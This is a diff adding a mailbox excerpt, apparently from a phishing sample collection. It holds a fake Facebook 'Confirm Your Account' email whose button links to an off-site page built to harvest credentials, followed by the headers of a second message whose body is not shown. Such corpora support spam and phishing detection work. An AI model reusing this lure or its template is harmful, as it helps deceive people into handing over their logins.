@@ -1,0 +1,129 @@
+From: Facebook <custmerservice.facebook@sim.simeon.com.br>
+Reply-To: custmerservice.facebook@sim.simeon.com.br
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: www.acspmbmgo.com.br
+Message-Id: <E1ZTXpJ-0001b1-DQ@sim.simeon.com.br>
+Date: Sun, 23 Aug 2015 13:08:57 -0300
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - sim.simeon.com.br
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [501 32007] / [47 12]
+X-AntiAbuse: Sender Address Domain - sim.simeon.com.br
+X-Get-Message-Sender-Via: sim.simeon.com.br: authenticated_id: acspmbmg/primary_hostname/system user
+X-Source: /usr/bin/php
+X-Source-Args: /usr/bin/php /home/acspmbmg/public_html/index.php 
+X-Source-Dir: acspmbmgo.com.br:/public_html/img/oficiosimg
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 157
+
+<html>
+
+<head>
+<title>E-mail Spam and Fraudulent Survey</title>
+<style type="text/css">
+<!--
+.style2 {font-family: "Courier New", Courier, monospace}
+.style4 {color: #330066; font-weight: bold; font-size: 20px;
+font-family: "Courier New", Courier, monospace; }
+.style8 {font-size: 13px}
+.style9 {
+    color: #2672ec;
+    font-weight: bold;
+}
+body {
+    background-color: #E8E8E8;
+    border-bottom-color: #E8E8E8;
+    border-color: #E8E8E8;
+    border-left-color: #E8E8E8;
+    border-right-color: #E8E8E8;
+    border-top-color: #E8E8E8;
+    color: #CCCCCC;
+    outline-color: #E8E8E8;
+}
+body, td, th {
+    font-family: Courier New, Courier, monospace;
+}
+.style10 {color: #E8E8E8}
+-->
+</style>
+<meta http-equiv="Content-Type" content="text/html">
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<HTML>
+<body><TABLE style="BORDER-BOTTOM: thin solid; BORDER-LEFT: thin
+solid; BORDER-TOP: thin solid; BORDER-RIGHT: thin solid" cellSpacing=0
+borderColor=#e1e1e1 width="100%" bgColor=#e8e8e8 align=center
+height=539>
+<TBODY>
+<TR>
+<TD bgColor=#e8e8e8>
+<TABLE style="BORDER-BOTTOM: thin solid; BORDER-LEFT: thin solid;
+BORDER-TOP: thin solid; BORDER-RIGHT: thin solid" cellSpacing=10
+width=434 bgColor=#ffffff align=center height=277>
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px;
+FONT-FAMILY: ; PADDING-TOP: 0px" class=style10 height=26 width=410>
+<img src="http://media.bestofmicro.com/R/O/464964/original/Facebook-logo-PSD.jpg" width="394" height="113"></TD></TR>
+<TR vAlign=top align=left>
+<TD style="PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px;
+FONT-FAMILY: 'Segoe UI'; COLOR: #2a2a2a; FONT-SIZE: 12px; PADDING-TOP:
+14px" height=112>
+<P class=style2><b><font size="3"> Dear jose@monkey.org
+, <BR><BR>
+
+ We just need you to do one more thing:</font></b></P></TD></TR>
+<TR align=left bgColor=#2672ec>
+<TD style="MIN-WIDTH: 10px; PADDING-BOTTOM: 5px; BACKGROUND-COLOR:
+#2672ec; PADDING-LEFT: 20px; PADDING-RIGHT: 20px; PADDING-TOP: 2px"
+bgColor=#2672ec height=22>
+<p align="center">
+<A style="TEXT-ALIGN: center; FONT-FAMILY:
+'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue
+Medium', Arial, sans-serif; LETTER-SPACING: 0.02em; COLOR: #FFFFFF;
+FONT-WEIGHT: 700; TEXT-DECORATION: none"
+href="http://ifrcweb.com/admin/Public/bookmark/ii.php?email=jose@monkey.org
+&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1">
+Confirm Your Account.</A></TD></TR>
+</TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML></body>
+
+</html>
+
+From kiptrying1@suddenlink.net  Mon Aug 24 02:36:03 2015
+Return-Path: <kiptrying1@suddenlink.net>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id A0D51F4165
+	for <jose@login.monkey.org>; Mon, 24 Aug 2015 02:36:03 -0500 (CDT)
+Received: from smtpin10.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 55B1434E1B0
+	for <jose@login.monkey.org>; Mon, 24 Aug 2015 07:36:03 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70554835806.10.crook15_6efb2586fb61c
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,3,0,8dbc490d89e8ddf9,d41d8cd98f00b204,kiptrying1@suddenlink.net,:kiptrying1@suddenlink.net,RULES_HIT:41:72:355:379:455:962:967:969:973:978:983:988:989:1189:1208:1221:1260:1263:1313:1314:1345:1381:1431:1432:1433:1434:1436:1437:1516:1517:1518:1535:1544:1545:1548:1555:1571:1575:1588:1589:1592:1594:1685:1711:1714:1730:1776:1792:1803:2107:2194:2198:2199:2200:2525:2527:2560:2568:2610:2612:2635:2682:2685:2859:2890:2891:2892:2915:2920:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3350:3865:3866:3867:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4118:4321:4362:4365:5007:6238:6261:6684:6687:7208:7652:8516:8518:8599:8603:8651:9025:9082:9111:9149:9388:9392:9411:10012:10049:10215:10305:10346:10881:11233:11257:11473:11529:11651:11657:11658:11815:11914:12043:12217:12522:12555:12561:12679:12729:12737:13019:13110:13139:13141:13163:13229:13230:13236:13237:13374:14037:14246:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:
+X-HE-Tag: crook15_6efb2586fb61c
+X-Filterd-Recvd-Size: 7130
+Received: from txasav-vm06.suddenlink.net (txasav-vm06.suddenlink.net [208.180.40.75])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 24 Aug 2015 07:36:02 +0000 (UTC)
+Received: from [74.208.101.231] by txasav-vm06.suddenlink.net
+          (InterMail vM.8.04.03.20 201-2389-100-164-20150330) with ESMTP
+          id <20150824073602.BJDV11272.txasav-vm06.suddenlink.net@[74.208.101.231]>;
+          Mon, 24 Aug 2015 02:36:02 -0500
+Content-Type: multipart/alternative; boundary="===============0317615443=="
+MIME-Version: 1.0
+Subject: update
+To: Recipients <kiptrying1@suddenlink.net>
